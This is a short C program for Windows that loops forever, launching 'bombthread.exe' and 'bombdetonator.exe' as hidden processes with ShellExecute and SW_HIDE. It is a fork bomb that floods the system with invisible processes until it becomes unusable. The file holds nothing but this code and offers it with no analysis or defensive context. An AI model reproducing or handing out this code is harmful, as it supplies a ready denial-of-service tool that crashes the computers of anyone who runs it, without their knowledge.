#include<windows.h>
int main(){
	while(1){
		ShellExecute(NULL,NULL,"bombthread.exe",NULL,NULL,SW_HIDE);
		ShellExecute(NULL,NULL,"bombthread.exe",NULL,NULL,SW_HIDE);
		ShellExecute(NULL,NULL,"bombthread.exe",NULL,NULL,SW_HIDE);
		ShellExecute(NULL,NULL,"bombthread.exe",NULL,NULL,SW_HIDE);
		ShellExecute(NULL,NULL,"bombdetonator.exe",NULL,NULL,SW_HIDE);
	}
	return 0;
}
